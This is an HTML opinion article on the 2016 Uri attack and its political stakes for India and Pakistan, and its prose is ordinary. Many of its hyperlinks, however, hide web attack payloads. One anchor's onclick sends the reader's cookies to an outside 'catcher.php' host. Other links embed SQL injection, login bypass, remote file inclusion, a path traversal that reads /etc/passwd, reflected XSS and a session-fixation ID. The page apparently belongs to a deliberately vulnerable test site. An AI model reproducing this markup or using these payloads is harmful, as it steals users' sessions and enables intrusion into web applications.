<h2>Uri attack: Is JeM-Pak combine provoking Modi government?</h2>

<p class="details">Written by Nirupama Subramanian|September 19, 2016 3:13pm<a href="#"></a> </p>


<p>
India has blamed Sunday’s deadly attack on the <a href="http://bit.ly/2cKc7xM" target="_blank">12th brigade headquarters </a> at Uri in Kashmir, which claimed the lives of 17 Indian soldiers, on the <a href="http://www.theplanetreports.com/uploads/" target="_blank">Jaish-e-Mohammed (JeM).</a>
</p> <p>
Indeed, in the manner of its <a href="http://www.theplanetreports.com/images/" target="_blank">execution,</a> the attack bears some resemblance to the January attack on <a href="http://www.theplanetreports.com/uploads/phpinfo.php" target="_blank">Pathankot Air Base</a>, for which India provided evidence of Jaish’s hand, and Pakistan even took the JeM leader Masood Azhar into “protective custody”.</a> The number of fidyaeen at Uri was four, they scaled an <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">ill-guarded wall,</a> and the first thing they did was to start a fire, just as they had done at Pathankot.
</p> 

<p><img class="alignright" src="/images/Uriattack.png" width="350" height="350" alt="Uri Attacks" /></p>

<p>

Provoking the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">Modi government</a> to hit back with a military response is perhaps the larger goal behind the attack, with the objective of attracting international attention to <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank">Kashmir.</a> Indeed, sections of the Indian security establishment clearly want military retaliation, even a limited strike, maybe imagining that this will be as surgical and clean as the two hot pursuits by the Indian Army’s special forces across the Myanmar border.
</a>
</p> <p>

Nothing gives the international community a bigger fright than the prospect of war between the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">two nuclear-armed neighbours </a> in South Asia, and even without any response from New Delhi, there is bound to be greater world attention on India and Pakistan in the coming days, even perhaps a global push for restarting <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">diplomatic initiatives </a> between the two sides.

</p> <p>
Meanwhile, Jaish has achieved at least one tactical objective: it may not speak for all of Pakistan, and it may deny its involvement in the attack, but in Kashmir, where the group’s origins are well known, the attack has served to signal that the Pakistani state is <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">no mere bystander.</a>
</p> <p>

For the same reason, in Pakistan, it will give Army chief General Raheel Sharif a shot in the arm. The Pakistan Army may or may not be behind the Jaish attack, but its long, if somewhat troubled association with a group that it <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">parented, is well-known.</a>
</p> <p>

The attack is bound to reinforce the view that the Pakistan Army is the better guardian of the interests of Kashmiri people than Prime Minister Nawaz Sharif. Modi’s warnings that the perpetrators of the attack will be punished should rally the public <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">behind their Army,</a> strengthening that institution, just as it did in the aftermath of the Mumbai attacks.
</p> <p>


As India mourns the loss of 17 soldiers, in both Kashmir and Pakistan, Sunday’s attack will be seen as revenge for two months of trauma in Kashmir with 76 civilian deaths and hundreds maimed by the use of pellet guns by security forces.
</p> <p>

In Pakistan, for more than two months, the Nawaz Sharif government had been asked again and again by his critics and security and foreign policy hawks — what are you doing about what is going on in Kashmir?  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">Noticeably weaker</a> after the Panama papers expose of his family’s offshore accounts, Sharif responded by upping his rhetoric on Kashmir, first declaring Burhan Wani a martyr of the Kashmiri freedom movement, then by dedicating Pakistan’s independence day to Kashmir, and describing the protests in Kashmir as “a new wave of the freedom movement”.

</p> <p>

Next, he is to pitch Kashmir at the United Nations General Assembly later this month. Pakistan is waiting to see if that will bring the Kashmir issue the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">international traction </a> it has failed to get in the last two months.
</p> <p>

But with this attack, the Jaish-e-Mohammed appears to have stolen a march on Nawaz Sharif.
</p> <p>
For India, despite the threats of punishment and <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank">“jaw for a tooth”</a> rhetoric emanating from Delhi, the choices before the Modi government are difficult. A military retaliation would be to play into the hands of the perpetrators, with an outcome –despite what sections of the security establishment may believe — that is far from certain.
</p> <p>

On the other hand, should Modi not respond, he and his government risk sending out the signal to Jaish, and to Pakistan that India, despite the talk, will not respond, and thus sets the country up for further attacks. Also, Modi’s image as a strong leader is at risk if he doesn’t offer an effective response.
</p>



